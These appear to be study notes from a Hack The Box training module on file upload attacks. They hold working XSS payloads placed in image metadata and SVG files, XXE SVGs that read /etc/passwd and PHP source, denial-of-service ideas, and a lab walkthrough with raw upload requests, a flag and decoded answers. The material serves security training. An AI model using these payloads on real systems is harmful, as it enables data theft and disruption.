---
tags: [CWES, HTB, technical-reference]
module: "File Upload Attacks"
source_file: "CWES.xmind"
---

# Limited File Uploads

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## fuzzing allowed file extensions is an important exercise for any file upload attack

## file types

### SVG, HTML, XML, and even some image and document files

### XSS

- Stored XSS
- most basic example
  - HTML
    - implement JavaScript code within them to carry an XSS or CSRF
  - web applications that display an image's metadata
    - include an XSS payload in one of the Metadata parameters
      - exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
        - exiftool HTB.jpg
          - Comment                         :  "><img src=1 onerror=alert(window.origin)>
    - change the image's MIME-Type to text/html
      - some web applications may show it as an HTML document instead of an image
  - SVG
    - images are XML-based
      - modify their XML data to include an XSS
        - HTB.svg
          - <?xml version="1.0" encoding="UTF-8"?>  
            <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">  
            <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">  
            <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />  
            <script type="text/javascript">alert(window.origin);</script>  
            </svg>
    - <https://enterprise.hackthebox.com/module/details/103>
  - XXE
    - leaks the content of (/etc/passwd):
      - <?xml version="1.0" encoding="UTF-8"?>  
        <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  
        <svg>&xxe;</svg>
    - another XML data
      - PDF, Word Documents, PowerPoint Documents
      - Server-side Attacks
    - read source code in PHP
      - <?xml version="1.0" encoding="UTF-8"?>  
        <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>  
        <svg>&xxe;</svg>
  - DoS
    - Decompression Bomb
      - If a web application automatically unzips a ZIP
        - upload a malicious archive containing nested ZIP archives within it
    - Pixel Flood
      - create any JPG image file with any image size (e.g. 500x500)
        - modify its compression data to say it has a size of (0xffff x 0xffff)
          - results in an image with a perceived size of 4 Gigapixels
    - forms may not limit the upload file size
    - If the upload function is vulnerable to directory traversal
      - attempt uploading files to a different directory (e.g. ../../../etc/passwd)
        - may also cause the server to crash
## LAB

### The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt"

- upload SVG conatins XXE
  - ------geckoformboundaryea65558dc97e301ca06f7b8ff90254b6  
    Content-Disposition: form-data; name="uploadFile"; filename="saudi1.svg"  
    Content-Type: image/svg+xml  

    <?xml version="1.0" encoding="UTF-8"?>  
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  
    <svg>&xxe;</svg>  
    ------geckoformboundaryea65558dc97e301ca06f7b8ff90254b6--
    - GET /
      - root:x:0:0:root:/root
  - Content-Disposition: form-data; name="uploadFile"; filename="saudi1.svg"  
    Content-Type: image/svg+xml  

    <?xml version="1.0" encoding="UTF-8"?>  
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>  
    <svg>&xxe;</svg>
    - GET /
      - HTB{my_1m4635_4r3_l37h4l}
### Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)

- upload SVG conatins XXE
  - Content-Disposition: form-data; name="uploadFile"; filename="saudi1.svg"  
    Content-Type: image/svg+xml  

    <?xml version="1.0" encoding="UTF-8"?>  
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>  
    <svg>&xxe;</svg>
    - GET /
      - PD9waHAK....Qo=
        - echo 'PD9waHAK....Qo=' | base64 -d
          - <?<!-- -->php  
            $target_dir = "./images/";  
            ....
